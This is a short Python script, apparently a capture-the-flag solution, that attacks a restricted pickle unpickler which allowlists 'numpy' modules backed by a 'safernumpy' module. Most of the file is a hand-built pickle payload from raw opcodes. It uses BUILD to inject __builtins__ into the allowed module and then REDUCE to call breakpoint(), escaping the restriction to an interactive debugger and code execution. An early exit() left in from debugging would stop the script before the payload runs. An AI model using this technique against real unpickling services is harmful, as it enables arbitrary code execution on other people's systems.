import safernumpy
import safernumpy.core.multiarray
from types import ModuleType    

def traits(x):
    for d in x.__dict__.keys():
        print(d, getattr(x, d), type(getattr(x, d)))


traits(safernumpy)
exit()
# print(traits(safernumpy.core.multiarray))

safe_modules = {
    'numpy',
    'numpy.core.multiarray',
}


import pickle
from io import BytesIO
import importlib

safe_modules = {
    'numpy',
    'numpy.core.multiarray',
}


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # Only allow safe modules.
        if "save" in name or "load" in name:
            return
        if module in safe_modules:
             import safernumpy
             import safernumpy.core.multiarray
             return getattr({"numpy": safernumpy, "numpy.core.multiarray": safernumpy.core.multiarray}[module], name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                     (module, name))


from pickle import * 

pkl = ( 
        GLOBAL + b"numpy\nsafernumpy\n" +
        MARK + 
            NONE + 
            GLOBAL + b"numpy\n__builtins__\n" + 
        TUPLE + 
        BUILD + 
        GLOBAL + b"numpy\nbreakpoint\n" + 
        EMPTY_TUPLE + 
        REDUCE +
       STOP
)

out = RestrictedUnpickler(BytesIO(pkl)).load()

print(out)

# print(traits(safernumpy.core))
